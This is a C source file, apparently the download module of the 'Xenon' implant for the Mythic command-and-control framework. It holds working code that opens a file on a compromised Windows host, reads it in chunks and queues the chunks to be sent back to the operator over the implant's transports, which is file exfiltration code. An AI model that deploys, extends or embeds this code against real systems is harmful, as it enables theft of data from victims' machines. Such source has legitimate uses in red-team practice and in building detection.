#include "Tasks/Download.h"

#include <windows.h>
#include "Xenon.h"
#include "Parser.h"
#include "Package.h"
#include "Task.h"
#include "Config.h"

#ifdef INCLUDE_CMD_DOWNLOAD

#ifdef HTTPX_TRANSPORT
#define CHUNK_SIZE  512000          // 512 KB
#endif
#ifdef SMB_TRANSPORT
#define CHUNK_SIZE  (12 * 1024)     // 12 KB
#endif
#ifdef TCP_TRANSPORT
#define CHUNK_SIZE  (12 * 1024)     // 12 KB
#endif
#ifdef WEBSOCKET_TRANSPORT
#define CHUNK_SIZE  512000          // 512 KB
#endif
VOID DownloadFree(_In_ PFILE_DOWNLOAD File);
/**
 * @brief Initialize a file download and return file UUID.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] File FILE_DOWNLOAD struct which contains details of a file
 * @return BOOL
 */
DWORD DownloadInit(_In_ PCHAR taskUuid, _Inout_ PFILE_DOWNLOAD File)
{
    DWORD Status = 0;

    if (!GetFileSizeEx(File->hFile, &File->fileSize))
    {
        DWORD error = GetLastError();
        _err("Error getting file size of %s : ERROR CODE %d", File->filepath, error);
        Status = error;
        return Status;
    }

    SIZE_T tuid = 0;
    strncpy(File->TaskUuid, taskUuid, TASK_UUID_SIZE + 1);
    
    /* Calculate total chunks (rounded up) for local read loop */
    File->totalChunks = (DWORD)((File->fileSize.QuadPart + CHUNK_SIZE - 1) / CHUNK_SIZE);
    File->currentChunk = 1;
    File->Initialized = FALSE;

    _dbg("Queueing Download for file %s (%I64d bytes, %d chunks, chunk size: %d)", File->filepath, File->fileSize.QuadPart, File->totalChunks, CHUNK_SIZE);

    /* Create Download Init package in Offset mode */
    PPackage data = PackageInit(NULL, FALSE);
    PackageAddByte(data, DOWNLOAD_INIT);
    PackageAddString(data, taskUuid, FALSE);
    PackageAddInt64(data, (UINT64)File->fileSize.QuadPart);
    PackageAddString(data, File->filepath, TRUE);
    PackageAddInt32(data, CHUNK_SIZE);      // Gets skipped in translator

    PackageQueue(data);

    return Status;
}

/**
 * @brief Update Mythic File UUID for Download Task 
 */
BOOL DownloadSync(_In_ PCHAR TaskUuid, _In_ PPARSER Response)
{
    PCHAR  FileUuid = NULL;
    SIZE_T fidLen   = 0;

    if ( !TaskUuid || Response == NULL ) {
        return FALSE;
    }

    UINT32 Status = ParserGetInt32(Response);       // TODO not totally sure where this is coming from

    FileUuid = ParserStringCopy(Response, &fidLen);

    PFILE_DOWNLOAD List = xenonConfig->DownloadQueue;

    /* Find Task This Belongs To */
    while ( List )
    {
        if ( strcmp(List->TaskUuid, TaskUuid) == 0 )
        {
            /* Only update file UUID if not initialized yet */
            if ( !List->Initialized )
            {
                /* Update file UUID */
                strncpy(List->fileUuid, FileUuid, sizeof(List->fileUuid));            
                _dbg("Set Download File Mythic ID: %s", List->fileUuid);

                List->Initialized = TRUE;
            }
            else
            {
                LocalFree(FileUuid);
            }
            
            return TRUE;
        }

        List = List->Next;
    }

    LocalFree(FileUuid);
    return TRUE;
}

/**
 * @brief Add instance of FILE_DOWNLOAD to global tracker
 */
VOID DownloadQueue(_In_ PFILE_DOWNLOAD File)
{
    _dbg("Adding file to download queue...");
    
    PFILE_DOWNLOAD List = NULL;

    if ( !File ) {
        return;
    }
    
    /* If there are no queued files, this is the first */
    if ( !xenonConfig->DownloadQueue )
    {
        xenonConfig->DownloadQueue  = File;
    }
    else
    {
        /* Add to the end of linked-list */
        List = xenonConfig->DownloadQueue;
        while ( List->Next ) {
            List = List->Next;
        }
        List->Next  = File;
    }
}


/**
 * @brief Queue the next file chunk (one per call) so only CHUNK_SIZE is in memory.
 *
 * @return TRUE if the download is finished (success or error) and should be removed from queue.
 */
BOOL DownloadQueueChunks(_Inout_ PFILE_DOWNLOAD File)
{
    BOOL  Success     = FALSE;
    DWORD bytesRead   = 0;
    char* chunkBuffer = NULL;

    if ( File->currentChunk == 0 )
        File->currentChunk = 1;

    /* Empty file, or all chunks already queued */
    if ( File->currentChunk > File->totalChunks )
    {
        PackageComplete(File->TaskUuid, NULL);
        return TRUE;
    }

    chunkBuffer = (char*)LocalAlloc(LPTR, CHUNK_SIZE);
    if ( !chunkBuffer )
    {
        DWORD error = GetLastError();
        _err("Memory allocation failed. ERROR CODE: %d", error);
        PackageError(File->TaskUuid, error);
        return TRUE;
    }

    _dbg("Downloading Mythic File as UUID : %s (chunk %d/%d)", File->fileUuid, File->currentChunk, File->totalChunks);

    if ( !ReadFile(File->hFile, chunkBuffer, CHUNK_SIZE, &bytesRead, NULL) )
    {
        DWORD error = GetLastError();
        _err("Error reading file: ERROR CODE: %d", error);
        PackageError(File->TaskUuid, error);
        Success = TRUE;
        goto CLEANUP;
    }

    if ( bytesRead == 0 )
    {
        _err("Unexpected EOF while reading %s at chunk %d/%d", File->filepath, File->currentChunk, File->totalChunks);
        PackageError(File->TaskUuid, ERROR_HANDLE_EOF);
        Success = TRUE;
        goto CLEANUP;
    }

    UINT64 chunkOffset = ((UINT64)File->currentChunk - 1) * (UINT64)CHUNK_SIZE;
    _dbg("Adding chunk %d/%d offset %I64u (size: %d)", File->currentChunk, File->totalChunks, chunkOffset, bytesRead);

    /* Queue file chunk */
    PPackage Chunk = PackageInit(NULL, FALSE);
    PackageAddByte(Chunk, DOWNLOAD_CONTINUE);
    PackageAddString(Chunk, File->TaskUuid, FALSE);
    PackageAddInt64(Chunk, chunkOffset);
    PackageAddBytes(Chunk, File->fileUuid, TASK_UUID_SIZE, FALSE);
    PackageAddBytes(Chunk, chunkBuffer, bytesRead, TRUE);
    PackageQueue(Chunk);

    /* Queue operator message, this isnt needed but is nice feedback */
    PPackage Pkg = PackageInit(NULL, FALSE);
    PackageAddFormatPrintf(Pkg, FALSE, "Downloaded %d / %d chunks ... \n\n", File->currentChunk, File->totalChunks);
    PackageUpdate(File->TaskUuid, Pkg);

    File->currentChunk++;

    if ( File->currentChunk > File->totalChunks )
    {
        PackageComplete(File->TaskUuid, NULL);
        Success = TRUE;
    }

CLEANUP:
    if ( chunkBuffer ) LocalFree(chunkBuffer);

    return Success;
}


/**
 * @brief Queue the next download chunk for each initialized transfer.
 *        The file stays in DownloadQueue until every chunk has been queued.
 */
VOID DownloadPush()
{
    PFILE_DOWNLOAD Current = xenonConfig->DownloadQueue;
    PFILE_DOWNLOAD Prev    = NULL;

    while ( Current )
    {

        PFILE_DOWNLOAD Next = Current->Next;

        if ( !Current->Initialized )
        {
            Prev = Current;
            Current = Next;
            continue;
        }

        if ( DownloadQueueChunks(Current) )
        {
            _dbg("Destroying Download from Queue File ID: [%s]", Current->fileUuid);

            /* Unlink */
            if ( Prev )
                Prev->Next = Next;
            else
                xenonConfig->DownloadQueue = Next;

            DownloadFree(Current);
            Current = Next;
            continue;
        }

        Prev = Current;
        Current = Next;

    }
}


/**
 * @brief Main command function for downloading a file from agent.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[in] arguments Parser with given tasks data buffer
 * 
 * @return VOID
 */
VOID Download(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{    
    UINT32 nbArg = ParserGetInt32(arguments);

    if (nbArg == 0)
    {
        return;
    }

    SIZE_T pathLen      = 0;
    DWORD status        = 0;
    PFILE_DOWNLOAD File = NULL;
    PCHAR FilePath      = NULL;

    File = (PFILE_DOWNLOAD)LocalAlloc(LPTR, sizeof(FILE_DOWNLOAD));         // Must Free

    if ( File == NULL )
    {
        _err("Failed to allocate for file download");
        return;
    }

    FilePath = ParserGetString(arguments, &pathLen);

    File->hFile = CreateFileA(FilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (File->hFile == INVALID_HANDLE_VALUE)
    {
        DWORD error = GetLastError();
        _err("Error opening file %s : ERROR CODE %d", FilePath, error);
        PackageError(taskUuid, error);
        goto end;
    }

    strncpy(File->filepath, FilePath, pathLen);

    // Prepare to send
    status = DownloadInit(taskUuid, File);
    if ( status != 0 )
    {
        PackageError(taskUuid, status);
        goto end;
    }


    /* Add Download Instance to Queue */
    DownloadQueue(File);

end:

    return;
}


/**
 * @brief Free the download
 */
VOID DownloadFree(_In_ PFILE_DOWNLOAD File)
{
    if ( !File )
        return;

    if ( File->hFile ) 
    {
        CloseHandle(File->hFile);
        File->hFile = NULL;
    }

    LocalFree(File);
    File = NULL;
}


#endif  //INCLUDE_CMD_DOWNLOAD
